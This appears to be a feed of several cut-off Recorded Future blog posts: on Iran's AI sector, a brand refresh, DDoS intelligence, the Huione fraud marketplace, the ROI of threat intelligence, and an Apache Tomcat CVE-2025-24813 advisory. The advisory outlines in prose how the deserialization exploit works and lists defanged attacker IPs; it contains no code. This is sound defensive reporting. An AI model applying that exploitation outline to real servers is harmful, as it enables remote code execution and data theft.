foundational AI model companies, low capital expenditures on AI by existing major players in the technology sphere, and a nascent venture capital (VC) ecosystem.</p><p>Iran almost certainly <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry" target="_blank">suffers</a> from a significant talent outflow of skilled workers in technology and AI. According to a 2021 report by the Iran Migration Observatory, 50% of Iranians <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry" target="_blank">involved</a> in startup communities and 44% of graduates were planning on emigrating, citing unpredictable internet regulations, censorship, and lack of wage competitiveness as direct factors. In December 2024, Irans Vice President Afshin announced a new regulation offering monthly grants of approximately 15 million Tomans ($3,564 USD) for PhD students to encourage research and scientific activities, stressing the importance of preventing talent migration.</p><p>Despite talent shortages, Indian data provider TraxCN has <a href="https://tracxn.com/d/artificial-intelligence/ai-startups-in-iran/__aWyQstgrq_MtBd_T7d2d9-itkASMubg8G_HbLca8W_8/companies" target="_blank">identified</a> at least 85 companies in Iran advertised as operating in the field of AI, with a majority focusing on developing AI enterprise applications and tools for healthcare, agriculture, and finance. Several companies provide chatbot services and LLMs, including Persian-language chatbots; however, it remains unclear whether they are developing proprietary models rather than deploying existing open-source models. Additionally, TraxCN considers that seventeen (20%) of these companies are currently deadpooled (no longer in business) and 60 (80.5%) remain unfunded, indicating that despite government efforts to incentivize AI startups, the average Iranian AI startup is doomed to fail in raising funds or operating sustainably. Iranian AI website Hooshio published a list of 29 Iranian AI companies, highlighting the Parth AI Research Center as one of the top five companies in the Middle East with more than 150 specialists in AI. The company claims to have Irans biggest AI research center with a department for machine vision, natural language processing (NLP), speech processing, and data analysis, as well as an AI college. </p><p>Irans private tech sector is likely trying to financially motivate AI innovation and engage with Irans developer community. Digikala, Irans <a href="https://www.crunchbase.com/search/organizations/field/organizations/location_identifiers/iran" target="_blank">biggest</a> technology and e-commerce company (valued at approximately $500 million USD as of August 2024), <a href="https://archive.ph/c9swn" target="_blank">hosted</a> an AI hackathon in March 2024 with a first-place prize of 60 million Tomans (approximately $14,258 USD). Notably, the hackathons rules <a href="https://archive.ph/c9swn" target="_blank">banned</a> participants from using Western AI models (listing models from Western companies like OpenAI, Anthropic, and Cohere), likely intending for participants to focus on using open-source models for hackathon entries.</p><p>Unlike their Western and Chinese counterparts, Iranian VC funds are likely limited in their ability to fund and support a domestic AI startup ecosystem to fulfill national security and economic priorities, with startups <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran" target="_blank">forecasted</a> to raise $28.13 million USD in capital in 2025 across all sectors. Irans Pardis Technology Park (PTP), dubbed Iran Silicon Valley and operating under the auspices of the Vice Presidency for Science, Technology, and Knowledge-based Economy, is the most significant center for developing startups and knowledge-based companies and commercialization of technology and innovations in Iran. PTP, which is part of the Iran International Innovation District, boasts 25.5 million EUR of foreign investments in its companies over the last five years and is also supported by the Iran National Innovation Fund, Irans version of a venture capital and private equity firm. </p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_009_300bca3ba4.png" alt="iran-ai-009.png"><em><strong>Figure 9:</strong> Forecasted capital raised by startups for 2025 in China, Russia, and Iran (Source: Statista <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/china#:~:text=The%20country%20in%20China%20is,US%2449.17bn%20in%202025." target="_">1<a/>, <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/russia#:~:text=Russia%20is%20projected%20to%20see,US%240.27bn%20in%202025." target="_">2</a>, <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran" target="_">3</a>)</em></p><h3 id="open-source">Open Source</h3><p>Open-source communities <a href="https://www.gov.uk/government/publications/ai-opportunities-action-plan-government-response/ai-opportunities-action-plan-government-response" target="_blank">play</a> an important role in the development of AI capabilities, as open-source AI models can <a href="https://web.archive.org/web/20190226132342id_/http://pdfs.semanticscholar.org/71bc/34f9611e020e5d673b03af354d45b022018d.pdf" target="_blank">lower</a> research and development costs, present opportunities for technology transfers, and reduce dependency on models developed by foreign companies. Irans open-source community almost certainly lags behind in terms of developing home-grown AI models, finetunes, and datasets. Data from open-source AI model platform HuggingFace shows that Farsi-language models (including multilingual models from US AI companies) are outnumbered by open-source models with language capabilities for Mandarin, Korean, or Russian. Sanctions are almost certainly <a href="https://arxiv.org/html/2404.05489v1" target="_blank">throttling</a> the emergence of a strong Iranian open-source software community. GitHub, a major platform for hosting open-source code, was <a href="https://github.blog/news-insights/policy-news-and-insights/advancing-developer-freedom-github-is-fully-available-in-iran/" target="_blank">blocked</a> in Iran in 2019 and only resumed operations in 2021 after securing a special license from the US Department of the Treasurys Office of Foreign Assets Control (OFAC) board.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_010_390ee0e747.png" alt="iran-ai-010.png"><em><strong>Figure 10:</strong> Number of models published on HuggingFace with language capabilities in Farsi, Russian, Korean, and Chinese (Source: <a href="https://huggingface.co/models" target="_blank">HuggingFace</a>)</em></p><p>Irans biggest open-source AI contributor, measured by the number of Farsi-language AI models published on Hugging Face, is likely <a href="https://huggingface.co/hezarai" target="_blank">Hezar AI</a>, followed by <a href="https://huggingface.co/persiannlp" target="_blank">Persian NLP</a> and <a href="https://huggingface.co/HooshvareLab" target="_blank">Hooshvare Research Lab</a>. US technology companies <a href="https://huggingface.co/facebook" target="_blank">Facebook</a> and <a href="https://huggingface.co/google" target="_blank">Google</a> are also among the top ten publishers of Farsi-language models on HuggingFace.</p><h3 id="foreign-cooperation">Foreign Cooperation</h3><p>Irans Organization for Development of International Science and Technology Cooperation (ODISTC) very likely plays a critical role in facilitating the exchange of ideas, goods, and services related to AI. ODISTC was set up to serve as a foundation for increasing scientific, technological and innovation communications with other countries, as well as securing a significant share of the regional and global trade of knowledge-based products. Among the services offered in ODISTCs Technological Exchange Office is bilateral scientific and technology cooperation in the form of joint research funds with the [sic] countries like China and Russia. More details pertaining to Irans cooperation with China and Russia are discussed below. </p><h4 id="china">China</h4><p>Irans technological cooperation with China is very likely a key strategic interest for Irans AI development. In 2021, Irans Strategic Council on Foreign Relations promoted building relationships between Iranian and Chinese technology companies and higher education institutions. AI was specifically mentioned as part of the Iran-China 25-year Comprehensive Partnership, officially signed in March 2021. A leaked version of the plan, sourced from Irans Ministry of Foreign Affairs and <a href="https://www.wilsoncenter.org/sites/default/files/media/uploads/documents/MEP_200831_OCC%2038%20v3%20%281%29.pdf" target="_blank">reported</a> by the Wilson Center, proposed the cooperation involved introducing joint pilot projects in the fields of smart technology and artificial intelligence. Second to the sale of its oil to China, Iran likely <a href="https://link.springer.com/chapter/10.1007/978-981-19-6700-9_32" target="_blank">views</a> AI development and technological exchanges as a top priority for its bilateral relations with China, and Chinas challenge to US dominance in AI development aligns with Tehrans goal to oppose US hegemony.</p><p>Chinas use of AI for surveillance and monitoring has very likely been the most robust area for Irans foreign AI engagement, enabling Chinese companies to expand their export of specific technologies that facilitate Iranian domestic repression. However, academic and research collaboration is very likely another key area in which Irans technology sector is benefitting from the relationship with China. In November 2024, Iranian company Bayan Rayan  the countrys only server producer  received an award at the 26th annual China Hi-Tech Fair (CHTF) 2024. In 2022, an official at Irans Islamic Azad University touted the Iran-China agreement as a golden opportunity to boost cooperation in AI and benefit from Chinese advancement in the AI field, noting that Iran had 3,000 Iranian students studying in China.</p><h4 id="russia">Russia</h4><p>The anti-West strategic alignment and commercial isolation that Iran and Russia both share, particularly as a result of Russias war with Ukraine, has <a href="https://www.cna.org/reports/2025/01/The-Evolving-Russia-Iran-Relationship.pdf" target="_blank">resulted</a> in deeper cooperation in many security-related fields. Despite the <a href="https://isis-online.org/isis-reports/mobile/iran-russia-military-technology-axis-russia-showcases-to-iran-new-and-advan" target="_blank">increased</a> <a href="https://www.cfr.org/blog/iran-russia-cyber-agreement-and-us-strategy-middle-east" target="_blank">cooperation</a> in several <a href="https://www.wsj.com/articles/russia-supplies-iran-with-cyber-weapons-as-military-cooperation-grows-b14b94cd" target="_blank">spheres</a>, specific details on the extent of the current Iran-Russia collaboration on AI R&amp;D are limited. In January 2025, Tehran and Moscow signed a comprehensive twenty-year strategic partnership agreement that reinforced areas of ongoing cooperation in the technical sphere, including information and communication technologies, digital development, and higher education. While the text of the agreement does not specifically mention AI, Irans Ministry of Foreign Affairs stated the agreement provides a platform for sharing knowledge and collaboration in fields such as nanotechnology, aerospace, artificial intelligence, and medical sciences and expands cooperation at the government and academic levels.</p><p>Leading up to the 2025 comprehensive agreement, a flurry of Iran-Russia cooperation documents and engagements have promoted cooperation on AI. In March 2024, the two countries signed a Memorandum of Understanding to cooperate on ethics in AI, exchanging experiences in the implementation of the ethical principles of AI. The agreement specified that the Russian Commission on Ethics in AI would provide training for Irans AI and Robotics Development headquarters. In November 2019, Russia and Iran signed a Memorandum of Understanding on cooperation to support twenty joint research plans in fifteen scientific fields, including, among others, information technology, computer systems, and AI.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-ir-2025-0417.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<h2 id="the-next-chapter-in-our-journey">The next chapter in our journey</h2><p><img src="https://cms.recordedfuture.com/uploads/rebrand_001_77f3ccc1db.png" alt="rebrand-001.png"></p><p style="font-size:1.5rem;">Today marks an exciting milestone as we unveil Recorded Future's refreshed brand identity and website  a transformation that reflects the <a href="https://www.recordedfuture.com/blog/6-threat-intelligence-outlooks-strategies-2025" target="_blank">next chapter in cybersecurity</a> and threat intelligence. This evolution arrives at a pivotal moment when organizations face increasingly sophisticated threats that demand clarity, focus, and actionable insights.</p><p>The inspiration for this refresh became clear while walking the floors at cybersecurity conferences. Amid a sea of sameness  dark displays, matrix-like code animations, and ubiquitous hooded figures  the messaging blends together in an indistinguishable haze of technical jargon and vague promises.</p><p>For security leaders tasked with protecting their organizations, this uniformity creates a real challenge: how to identify what truly matters when everyone looks and sounds the same?</p><p>This observation became the catalyst for our brand refresh  not just as a marketing initiative, but as an authentic expression of how Recorded Future helps security professionals cut through overwhelming noise to focus on what&#39;s essential.</p><h2 id="deconstructing-our-brand-heritage">Deconstructing our brand heritage.</h2><p>This journey wasn&#39;t about creating a new logo  Recorded Future already had a strong visual mark. Instead, we focused on building a comprehensive visual and verbal language that embodies clarity and precision. The deconstructed logo became an important aspect of our brand system, allowing us to create meaningful visual elements that connect our identity with the purpose that has been at the heart of our company since we were founded in 2009. </p><p><img src="https://cms.recordedfuture.com/uploads/rebrand_002_f65ed09a0f.png" alt="rebrand-002.png"></p><p>It also became a symbol of premium offering in the category. When we created patterns using deconstructed elements of the logo, we were struck by their beauty being reminiscent of Hermes scarves (another brand that is at the pinnacle of their category).</p><p>The process involved examining countless competitor websites, which blended together in a blur of undifferentiated, fear-based messaging. The question emerged: &quot;Could our brand serve as an antidote to this confusion, bringing the same clarity to our marketing that our platform brings to threat intelligence?&quot; This approach transcended typical design exercises. It centered on authentically representing the value we provide. Our customers aren&#39;t just buying software  they&#39;re seeking confidence amid constant pressure and overwhelming data. They need a partner who understands their fundamental requirement: knowing which threats truly matter to their business.</p><h2 id="crafting-our-story-finding-our-voice">Crafting our story. Finding our voice.</h2><p>When drafting our brand narrative, the team read it aloud together to feel how the words resonated beyond how they appeared on paper. The opening lines captured our essence perfectly:</p><p><em>&quot;In cybersecurity, your greatest fear isn&#39;t the threats you see coming. It&#39;s the critical signals that get lost in the noise.&quot;</em></p><p>This became our north star, guiding the development of four pillars for our design system:</p><ul><li><strong>Meaningful</strong>  Reinforcing what we stand for and the value we deliver to customers</li><li><strong>Bold</strong>  Being distinctive, confident, and immediately recognizable in a crowded marketplace</li><li><strong>Premium</strong>  Conveying the sophistication that positions us as the market leader in intelligence</li><li><strong>Helpful</strong>  Using design to help customers discover relevant content and navigate complex information</li></ul><h2 id="visual-distinction-with-purpose">Visual distinction with purpose.</h2><p>The introduction of vibrant electric blue serves as more than an aesthetic choice  it symbolizes our promise to illuminate what matters in a noisy threat landscape.

            <content:encoded><![CDATA[<p>DDoS (distributed denial-of-service) attacks have existed since the early days of the internet. While new tricks occasionally pop uplike leveraging certain vulnerabilities to amplify attacksthe core idea remains: overwhelming servers with more traffic than they can handle. Think of it as trying to push the ocean through a straw. When these attacks grow big, they can even disrupt internet providers themselves. Companies like <a href="" target="_blank">Google</a> and <a href="" target="_blank">Cloudflare</a> still battle these threats regularly, proving DDoS remains a serious issue even in 2025.</p><p>Historically, cybercriminals have targeted entire industries like airlines and banks, shutting the companies down until they paid. State-backed groups from countries like <a href="" target="_blank">Russia</a> and <a href="" target="_blank">Iran</a> also use DDoS attacks as weapons against their enemies.</p><h2 id="why-spend-money-before-an-attack-happens">Why Spend Money Before an Attack Happens?</h2><p>Protecting against DDoS attacks matters because downtime means losing money or, for critical services, even worse consequences. But if your company hasn&#39;t been hit yet, why spend money on defenses? When should you start protecting yourself?</p><p>Thats where threat intelligence comes in handy. By looking at data and comparing trends, threat intelligence helps you decide if and when investing in DDoS defenses makes sense. It provides the insights to answer these questions for DDoS and any other cyber risk that may create one or more of the <a href="" target="_blank">five risk impacts</a>.</p><h2 id="smart-data-means-smart-decisions">Smart Data Means Smart Decisions</h2><p>Good decisions need good data. Recorded Future tracks thousands of DDoS attacks every day, giving you a clear picture of whos getting hit and how often. Pulling data from the Recorded Future API gives analysts useful analytics, like IP addresses targeted by attackers.</p><p>With this data, security teams can:</p><ul><li>Spot trends and predict who might be next</li><li>Automate defenses and make faster decisions</li><li>Better manage risk, knowing exactly when and how to invest</li></ul><p><img src="https://cms.recordedfuture.com/uploads/9cd3a7d8_dc4a_420b_af20_ae1fe216b00c_1132x480_2b01cef361.webp" alt="9cd3a7d8-dc4a-420b-af20-ae1fe216b00c_1132x480.webp"><em>DDoS target list courtesy of Recorded Future</em></p><h2 id="whos-being-targeted">Who&#39;s Being Targeted?</h2><p>Launching DDoS attacks isnt technically difficult. Someone with basic internet know-how can do it. But some attackers put more effort into it, building armies of infected devices known as botnets. One tool frequently used by pro-Russian hackers, called DDoSia, attacks different targets daily. By tracking whos getting hit most, businesses can better prepare their defenses.</p><p>For example, Ukraine currently faces heavy attacks due to geopolitical tensions. But finance and transportation companies in Europe are also frequent targets, suggesting broader threats.</p><p><img src="https://cms.recordedfuture.com/uploads/4f39046a_858e_4e69_83dc_0ad1f3681c3b_1600x991_b89526a771.webp" alt="4f39046a-858e-4e69-83dc-0ad1f3681c3b_1600x991.webp"><em>Ten months of DDoSia targets by industry, courtesy of Recorded Future</em></p><h2 id="thinking-bigger-than-just-your-own-network">Thinking Bigger than Just Your Own Network</h2><p>When CISOs arent considering crafting better risk management narratives for executive consumption, they are contemplating improving operational resilience. Denial of service attacks fall squarely in this category. The revolving questions dont stop with an organizations local network perimeter (if such a thing even exists anymore) but extend to partners, suppliers, and wider internet infrastructure (e.g., DNS and CDN providers).</p><p>More than ever, daily business and geopolitical events create a cascading effect of cyber impacts. DDoS is always a possibility. Recent <a href="" target="_blank">attacks against X</a> (Twitters hip rebrand) are a good reminder.</p><h2 id="key-decisions-for-stronger-ddos-defense">Key Decisions for Stronger DDoS Defense</h2><p>The decisions that underpin DDoS defense and response correspond to organizational size, mission, footprint, regulatory compliance mandates, and resources. Here are some practical actions to consider:</p><ul><li>Partnering with your internet provider for fast response</li><li>Using scrubbing centers to filter attack traffic</li><li>Implementing challenge-response tests like CAPTCHAs</li><li>Deploying cloud protections like AWS Shield</li><li>Utilizing web application firewalls (WAF)</li><li>Optimizing network setups (like load balancers and distributed data centers)</li><li>Filtering traffic using firewalls and intrusion systems</li><li>Relying on content delivery networks (CDNs)</li><li>Using Anycast routing to protect DNS services</li></ul><p><img src="https://cms.recordedfuture.com/uploads/51a7bcf4_e610_4a16_afd3_cdd56703060c_1024x1024_aca0202dc0.webp" alt="51a7bcf4-e610-4a16-afd3-cdd56703060c_1024x1024.webp"><em>Analytic contemplation courtesy of Gemini</em></p><h2 id="everyones-a-target">Everyones a Target</h2><p>Its tempting to think your business won&#39;t face a DDoS attack, especially if it&#39;s small or non-political. The reality? Anyone online can become a target for extortion or political agendas. That&#39;s why proactive intelligence is so valuableit helps security teams know when threats are getting closer and when its time to upgrade defenses.</p><p>As the frequency of DDoS attacks increases around certain industries or regions, it&#39;s essential to reassess and strengthen your own security controls accordingly. The closer these threats get, the more your organization should test their resilience. Said differently, as DDoS attack proximity moves closer to an organization, the operational disruption risk may, in parallel, need to <a href="" target="_blank">move north on the resilience axis</a>.</p><p><img src="https://cms.recordedfuture.com/uploads/e749bad6_f210_4917_a230_a144e9e72ae7_1600x900_ff2063ce4a.webp" alt="e749bad6-f210-4917-a230-a144e9e72ae7_1600x900.webp"><em>Risk Graph courtesy of ChatGPT</em></p><h2 id="staying-one-step-ahead">Staying One Step Ahead</h2><p>DDoS attacks aren&#39;t going away, but they don&#39;t have to be a nightmare, either. Threat intelligence provides the clear insights needed to prepare and respond effectively. By using analytics wisely, organizations can invest smartly, build stronger defenses, and keep their operations running smoothly. When attacks creep closersay, spiking in your sector or geographysecond-order risks (like operational disruption) loom larger. Thats your cue to prioritize resilience, whether a CDN subscription or ISP speed-dial.</p>]]></content:encoded>

            <content:encoded><![CDATA[<h2 id="the-global-fraud-landscape">The Global Fraud Landscape</h2><p>Fraud is a booming industry, with scammers <a href="https://www.gasa.org/_files/ugd/7bdaac_9060be8317424edd9964072cf279a0a4.pdf" target="_blank">pulling in</a> over <strong>$1 trillion</strong> from their victims in 2024. Businesses are paying the price: <strong>87%</strong> of businesses <a href="https://www.veriff.com/ebooks/us-industry-pulse-survey-2024" target="_blank">reported</a> an increase in online fraud, with most experiencing a <strong>1% to 9%</strong> loss in revenue as a result. In terms of individual consumers, Asia reported digital scam losses <a href="https://www.mastercard.com/news/ap/en/perspectives/en/2025/evolution-of-fraud-and-scams-in-asia-the-need-for-a-unified-defence/" target="_blank">reaching</a> <strong>$700 billion</strong> last year, compared to the <strong>$12.5 billion</strong> reported by US consumers in <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024" target="_blank">2024</a>. </p><p>Trust-based financial exploitation scams are especially lucrative. Examples include <a href="https://www.scamwatch.gov.au/stay-protected/real-life-stories/dating-and-romance-scam-georginas-facebook-fianc%C3%A9-leaves-her-flat-broke" target="_blank">romance</a> scams, investment scams, or <a href="https://www.abc.net.au/news/2025-02-24/fake-chinese-authority-scam-extorting-millions/104974122" target="_blank">impersonation</a> scams. Fraudulent actors can adapt impersonation scams to target businesses, such as by posing as regulators or <a href="https://www.cnn.com/2024/02/04/asia/deepfake-cfo-scam-hong-kong-intl-hnk/index.html" target="_blank">impersonating</a> executives. The percentage of people who reported losing money to fraud and scams <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024" target="_blank">increased</a> from 27% in 2023 to 38% in 2024, suggesting that scams are increasingly more effective and believable. </p><h2 id="huione-marketplace-the-one-stop-shop-for-fraud">Huione Marketplace: The One-Stop Shop for Fraud</h2><p>Online platforms that market tools and services to Chinese-speaking cybercriminals are one factor behind this boom, making it easier for criminals to execute fraud at scale. <a href="https://support.recordedfuture.com/hc/en-us/articles/37986893239187-Huione-Guarantee-Serves-as-a-One-Stop-Shop-for-Chinese-Speaking-Cybercriminals" target="_blank">Huione Guarantee</a>, a prominent gray-market hub that operates under the Huione Group, a Cambodian financial conglomerate, <a href="https://www.wired.com/story/the-largest-illicit-online-marketplace-ever-is-growing-at-an-alarming-rate" target="_blank">acts</a> as a one-stop shop for fraud-related tools and services. The website compiles Telegram channels with posts offering cryptocurrency mining tools, money laundering, and <a href="https://www.straitstimes.com/singapore/10m-lost-in-malware-scam-where-victims-banking-credentials-stolen-by-keylogger-hidden-in-app" target="_blank">malware-as-a-service</a>. The channels also promote offerings that use social engineering to facilitate fraud, including the sale of social media accounts to adopt realistic online personas, as well as personal, financial, and employment data to personalize the scam. Sellers also advertise generative AI deepfake voice and face-changing tools, some of which list <a href="https://www.cnbc.com/2023/10/17/us-bans-export-of-more-ai-chips-including-nvidia-h800-to-china.html" target="_blank">US-sanctioned</a> computer hardware components in the technology specifications.

However, political instability and weak governance in regions where these centers operate make sustained enforcement efforts challenging. </p><p>Huione infrastructure also supports money laundering services through Huoine Pay, the conglomerates banking arm. The Huione Pay website advertises money laundering services along with other scam tools.

            <content:encoded><![CDATA[<p>In today&#39;s unpredictable threat landscape, cybersecurity isn&#39;t just an IT concernit&#39;s a critical business initiative with direct impact on your organization&#39;s bottom line and brand reputation. As threat actors grow increasingly sophisticated, security leaders face mounting pressure to demonstrate the tangible value of their cybersecurity investments.</p><h2 id="the-financial-and-business-impact-of-cyber-risks">The Financial and Business Impact of Cyber Risks</h2><p>Cyber threats pose far more than just technical challengesthey carry significant financial and operational consequences that can affect an organization&#39;s bottom line, stakeholder confidence, and long-term sustainability. Recent research quantifies that impact: the average <a href="https://www.ibm.com/reports/data-breach" target="_blank">cost of a data breach</a> now stands at $4.88 million, and the aftermath of cybersecurity incidents often extends well beyond the immediate financial losses.</p><p>For businesses, the equation is simple yet profound: effective <a href="https://www.recordedfuture.com/blog/supercharge-risk-reduction" target="_blank">cybersecurity risk reduction</a> directly translates to business value. By implementing proactive threat intelligence and comprehensive security measures, organizations can:</p><ul><li>Prevent revenue losses from operational disruptions</li><li>Avoid costly fraud and impersonation schemes</li><li>Strengthen customer trust and brand reputation</li><li>Reduce cyber insurance premiums</li><li>Minimize recovery costs from security incidents</li></ul><h2 id="the-cost-of-cyber-risks-to-businesses">The Cost of Cyber Risks to Businesses</h2><p>According to new research conducted with hundreds of Recorded Future customers, organizations are seeing substantial ROI from their threat intelligence investments in areas that extend far beyond traditional security metrics. The data, compiled in Recorded Future&#39;s comprehensive 2025 ROI Report, <a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi" target="_blank">How Recorded Future Drives ROI for Cybersecurity Teams,</a> reveals how mature threat intelligence programs translate directly to business resilience and financial benefits.</p><h3 id="brand-reputation-impact">Brand Reputation Impact</h3><p>When a company falls victim to a cyber attack, the damage to brand reputation can be substantial and long-lasting. Typosquattingthe practice of creating deceptively similar domain names to legitimate websitesoften serves as vectors for phishing attacks that can compromise customer data and customer trust.</p><p>Recorded Future customers reported that they are now 51% more efficient at taking down typosquatting instances. Swift typosquat mitigation not only helps combat phishing attempts, but it also enables your customers to seamlessly carry out the actions they set out to accomplish by visiting your site. We see that as an increase in web traffic that we can quantify the value of with the help of research by the <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf" target="_blank">University of Illinois</a>. </p><p>An average billion-dollar business sees 2 million monthly web visits. At an average loss rate of 5.28% due to typosquatting according to research from <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf" target="_blank">University of Illinois</a>, more efficient typosquat takedowns with Recorded Future would help them recover over 50,000 website visits each month  and an expected $2,602 monthly value.</p><p>&quot;We have improved brand protection by at least 100%. We can identify risks and patterns in infancy stages, and we&#39;ve automated brand scanning to eliminate hours of manual work. As we automate more coverage, we have saved hundreds of labor hours per quarter and improved efficiency,&quot; reports <a href="https://app.userevidence.com/assets/8091GFKY" target="_blank">Joe Azzouggagh, Manager of Trust and Safety at ruby</a>.</p><h3 id="cyber-insurance-considerations">Cyber Insurance Considerations</h3><p>As cyber attacks have become more prevalent, cyber insurance has evolved from a nice-to-have to a business necessity. However, premiums can be substantial, particularly for organizations that face significant risk.</p><p>Based on observable market data and the average 2024 <a href="https://www.ibm.com/reports/data-breach" target="_blank">cost of a breach</a> being $4.88 million, a typical billion-dollar company likely pays a yearly premium of $207,400, or $35-50,000 per million of coverage.</p><p>Recorded Future customers report average monthly premium savings of $2,497approximately $30,000 annually. One customer, <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&wmediaid=1j7x7zezcc" target="_blank">Cummins</a>, achieved an impressive 32% year-over-year reduction in cyber insurance premiums after implementing Recorded Future&#39;s threat intelligence platform.</p><h3 id="operational-disruption-and-downtime">Operational Disruption and Downtime</h3><p>Service disruptions resulting from cyber incidents carry dual consequences: immediate revenue losses and lasting reputational damage. <a href="https://www.recordedfuture.com/blog/reducing-operational-risk-with-threat-intelligence" target="_blank">Reducing operational risk</a> has become a priority for organizations of all sizes. When systems go offline due to ransomware or distributed denial-of-service (DDoS) attacks, every minute of downtime translates to financial impact.</p><p>Our customers report that threat intelligence from Recorded Future helps minimize downtime, which for a billion-dollar organization translates to an average revenue value of approximately $19,025 per monthor nearly $230,000 annually. This calculation doesn&#39;t even account for the additional benefit of avoiding reputational damage that inevitably accompanies service disruptions.</p><p>Recorded Future allows us to shift our mindset from being more reactive in nature to being more proactive and responsive to threats that went unnoticed in the past. This, in turn, has facilitated the development of new processes that have enhanced the overall security posture of the business,&quot; explains a <a href="https://app.userevidence.com/assets/2791JWBD" target="_blank">Lead Cyber Defense Engineer at a major food and staples retailing company</a>.</p><h3 id="fraud-prevention">Fraud Prevention</h3><p>Payment fraud, transaction fraud, and billing schemes represent significant financial threats to businesses across industries. Through comprehensive threat intelligence, organizations can identify and mitigate these risks before they materialize into actual losses.</p><p>Recorded Futures threat intelligence helps customers reduce fraud losses.

            <description><![CDATA[Learn about CVE-2025-24813 affecting Apache Tomcat products. Patch now to prevent remote code execution. ]]></description>
            <content:encoded><![CDATA[<h2 id="what-is-cve-2025-24813">What is CVE-2025-24813?</h2><p><a href="https://www.recordedfuture.com/vulnerability-database/CVE-2025-24813">CVE-2025-24813</a> is a critical path equivalence vulnerability in Apache Tomcat, with exploitation attempts by threat actors observed in the wild. The vulnerability allows attackers to execute arbitrary code on vulnerable servers without authentication under specific conditions, potentially leading to system compromise and sensitive data being exposed. </p><p>Organizations affected by the configuration required for exploitation should patch CVE-2025-24813 to mitigate potential attacks and protect sensitive data from unauthorized access.</p><p>The vulnerability affects Tomcat versions 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and 9.0.0. M1 to 9.0.98. <strong>Additionally, Insikt Groups analysis found that 8.5.x versions (specifically 8.5.0 to 8.5.98 and 8.5.100, with the exception of 8.5.99) are also vulnerable, though they were not included in the initial set of affected products by Apache.</strong></p><h2 id="insikt-groups-assessment-of-cve-2025-24813">Insikt Groups Assessment of CVE-2025-24813</h2><p>CVE-2025-24813 stems from Tomcats handling of partial PUT requests and allows remote, unauthenticated attackers to conduct remote code execution (RCE), view security-sensitive files, and inject content into those files. </p><p>Exploitation involves two primary steps: </p><ul><li>The attacker sends a PUT request containing a Base64-encoded serialized Java payload to the server. This payload is designed to trigger RCE upon deserialization.</li><li>The attacker then sends a GET request with a specially crafted JSESSIONID cookie referencing the malicious session, causing the server to deserialize the payload and execute arbitrary code.</li></ul><p>However, successfully conducting RCE requires the following conditions: </p><ul><li>The default servlet must have write permissions enabled (disabled by default) </li><li>Partial PUT support must be enabled (enabled by default) </li><li>The application uses Tomcat&#39;s file-based session persistence with the default storage location </li><li>The application includes a library that can be leveraged in a deserialization attack</li></ul><p>If the following conditions are true, attackers can view sensitive security files and inject content into those files: </p><ul><li>The default servlet must have write permissions enabled (disabled by default)  </li><li>Partial PUT support must be enabled (enabled by default) </li><li>The target URL for sensitive uploads resides within a sub-directory of the public uploads directory </li><li>The attacker is aware of the filenames of the security-sensitive files being uploaded </li><li>The security-sensitive files are uploaded using partial PUT requests</li></ul><p>As such, only a limited number of Tomcat instances are likely to be affected by the configuration required for exploitation. For example, a GitHub code search query to check for the write permissions condition (<code>&lt;param-name&gt;readonly&lt; /param-name&gt; AND &quot;false&quot; language:xml</code>) shows only 218 open-source projects using this configuration.</p><p>Cybersecurity firm Greynoise has identified six malicious IP addresses attempting to exploit CVE-2025-24813, targeting systems in the US, Japan, Mexico, South Korea, and Australia. However, Insikt Group has not identified any evidence of successful exploitation or any evidence of known threat actors exploiting the vulnerability. At the time of writing, there were 378,444 exposed instances on Shodan. The specific versions are disclosed in the title and body of the servers responses.</p><table><tbody><tr><td><strong>Malicious IP Address</strong></td><td><strong>Source Location</strong></td><td><strong>Target Location</strong></td></tr><tr><td>203.160.68[.]24</td><td>Hong Kong</td><td>US</td></tr><tr><td>176.65.138[.]172</td><td>Germany</td><td>Japan, Singapore, Hong Kong, Indonesia, Pakistan, Taiwan</td></tr><tr><td>38.126.114[.]186</td><td>US</td><td>India, Japan, Mexico, US</td></tr><tr><td>188.213.161[.]98</td><td>Italy</td><td>Japan, South Korea</td></tr><tr><td>140.143.182[.]115</td><td>China</td><td>US, Australia, Mexico, South Korea</td></tr><tr><td>196.240.54[.]120</td><td>Latvia</td><td>US</td></tr></tbody></table><p><em><strong>Table 1:</strong> Malicious IP addresses attempting to exploit CVE-2025-24813 (Source: <a href="https://viz.greynoise.io/query/CVE-2025-24813" target="_blank">Greynoise</a>)</em> </p><p>Multiple proof-of-concept (PoC) exploits have been published, including by Palo Alto Networks and GitHub user iSee857.

            <description><![CDATA[Discover how Recorded Future improves cybersecurity team productivity, saving 100+ hours weekly and driving $290K in annual ROI through threat intelligence.]]></description>
